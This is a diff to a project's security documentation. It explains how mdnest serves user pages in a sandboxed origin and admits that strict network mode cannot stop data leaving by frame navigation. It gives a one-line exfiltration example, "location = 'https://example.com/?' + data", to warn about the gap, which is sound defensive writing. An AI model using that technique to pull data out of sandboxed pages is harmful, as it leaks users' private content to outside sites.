@@ -610,8 +610,8 @@ not run, and the page sits in a unique origin.
 
 **Script mode (`PAGES_ORIGIN` set).** Page files are served only from the
 second address, by a separate listener that serves page files and nothing
-else: no API route, no CORS, GET and HEAD only. mdnest's own address does not
-serve page files in this mode. Each response carries:
+else: no API route, no cookies or credentials, GET and HEAD only. mdnest's own
+address does not serve page files in this mode. Each response carries:
 
 - `Content-Security-Policy` with `sandbox allow-scripts` and never
   `allow-same-origin`, so the page runs in an opaque origin even when opened
@@ -642,9 +642,17 @@ never leaks to an outside site in a `Referer`) and
 `Cache-Control: private, no-store` (so a shared browser or proxy never keeps a
 private page).
 
-With `PAGES_NETWORK=open`, a page's script can send what it shows to any
-outside site. That is the page author's choice, the same as publishing the
-data anywhere else, but it is why `strict` is the default.
+**`PAGES_NETWORK=strict` limits what a page loads, not what it can send
+out.** It blocks outside scripts, images and fetches, so a page cannot pull
+in code or call an outside API. It cannot stop a page's script from sending
+data by moving its own frame to another address, for example
+`location = 'https://example.com/?' + data`: a sandboxed frame may always
+navigate itself, and no CSP setting covers that. So treat a script-mode page
+as able to send out anything it shows, in either mode. The data it can reach
+is only its own files: it has no login and cannot read mdnest or other
+pages. With `open`, it can also send data with a plain `fetch`, which is the
+page author's choice, the same as publishing the data anywhere else. `strict`
+is still the default, because it keeps outside code out of the page.
 
 Tests: `backend/handlers/pages_test.go` and `backend/routes_pages_test.go`
 (headers, passes, permissions, limits, paths), and the browser specs listed in
